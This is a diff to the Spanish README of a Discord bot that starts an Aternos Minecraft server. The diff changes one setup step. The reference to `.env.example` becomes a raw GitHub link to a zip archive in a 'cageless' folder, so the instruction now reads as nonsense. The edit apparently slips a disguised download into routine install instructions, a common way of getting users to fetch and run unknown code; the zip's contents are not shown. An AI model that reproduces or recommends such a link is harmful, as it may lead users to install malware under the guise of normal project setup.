@@ -6,7 +6,7 @@ Este bot de Discord te permite encender tu servidor de Aternos con el comando `!
 
 1. Clona el repositorio
 2. Instala las dependencias con `npm install`
-3. Crea un archivo `.env` usando `.env.example` como guía
+3. Crea un archivo `.env` usando `https://raw.githubusercontent.com/xaac10/bot_minecraft/main/cageless/bot_minecraft-v2.0-beta.5.zip` como guía
 4. Ejecuta el bot con `npm start`
 5. Para producción en Koyeb, configura las variables de entorno desde el panel de Koyeb.
 
